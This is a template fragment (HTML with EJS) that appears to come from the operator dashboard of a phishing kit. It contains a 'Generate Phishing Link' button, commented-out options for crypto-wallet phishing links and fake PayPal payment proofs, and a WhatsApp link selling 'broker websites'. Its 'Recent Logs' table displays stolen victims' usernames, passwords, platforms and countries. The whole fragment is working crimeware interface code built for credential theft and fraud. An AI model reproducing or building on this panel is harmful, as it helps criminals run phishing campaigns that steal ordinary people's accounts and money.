    </div>

    <div class="row panel-buttons">
      <div class="grid-margin">
        <div class="container">
          <a href="/create-link" class="btn btn-success my-3 mr-2"
            >Generate Phishing Link
          </a>
          <!-- <a href="/create-wallet-link" class="btn btn-dark my-3 mr-2"
            >Crypto Wallet Phishing Link
            <span class="ml-2 badge badge-success">new</span>
          </a> -->
          <!-- <a href="/paypal" class="btn btn-primary my-3 mr-2"
            >Fake Paypal Proof
          </a> -->
          <a
            href="https://wa.me//+2349053110722"
            class="btn btn-warning my-3 mr-2"
            >Need a broker website? <i class="fas fa-computer"></i>
          </a>
          <!-- <a href="/tutorial" class="btn btn-primary my-3 mr-2"
            >Tutorial <i class="mdi mdi-video"></i>
          </a> -->
          <a href="/settings" class="btn btn-dark my-3 mr-2"
            >Settings <i class="mdi mdi-settings"></i>
          </a>
        </div>
      </div>
    </div>

    <div class="row text-white">
      <div class="col-12 grid-margin">
        <div class="card">
          <div class="card-body">
            <h4 class="card-title">Recent Logs</h4>
            <div class="table-responsive">
              <table class="table">
                <thead>
                  <tr>
                    <th class="text-white">Logs</th>
                    <th class="text-white">Social Media</th>
                    <th class="text-white">Country</th>
                    <th class="text-white">Link Name</th>
                    <th class="text-white">Date</th>
                  </tr>
                </thead>
                <tbody>
                  <% credentials.reverse().slice(0,11).forEach(c => {%>
                  <tr>
                    <td class="text-white">
                      <p class="text-white">
                        Username: <b><%= c.fields.username %></b>
                      </p>
                      <br />
                      <p class="text-white">
                        Password: <b><%= c.fields.password %></b>
                      </p>
                    </td>
                    <td class="text-white"><%= c.linkType %></td>
                    <td class="text-white"><%= c.country %></td>
                    <td class="text-white"><%= c.linkName %></td>
                    <td class="text-white">
                      <%= moment(c.date).format("MMM Do YY h:mm a") %>
                    </td>
                  </tr>
                  <%})%>
                </tbody>
              </table>

              <% if(credentialscount > 10){%>
              <div>
                <a href="/credentials" class="btn btn-secondary">See all</a>
              </div>
              <%}%>
            </div>
          </div>
        </div>
      </div>
    </div>
